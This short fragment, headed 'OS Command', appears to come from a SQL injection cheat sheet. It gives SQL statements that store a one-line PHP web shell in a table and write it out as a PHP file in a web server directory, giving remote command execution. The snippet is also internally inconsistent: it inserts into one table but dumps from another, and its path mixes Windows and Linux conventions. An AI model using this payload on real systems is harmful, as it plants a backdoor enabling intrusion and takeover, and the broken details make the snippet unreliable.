#### OS Command

```
create table MeMe(stuff text);
insert into MeMe values('<?php system($_REQUEST["cmd"]); ?>');
select * from df into dumpfile 'C:\\var\\www\\html1\\cmd.php';
```
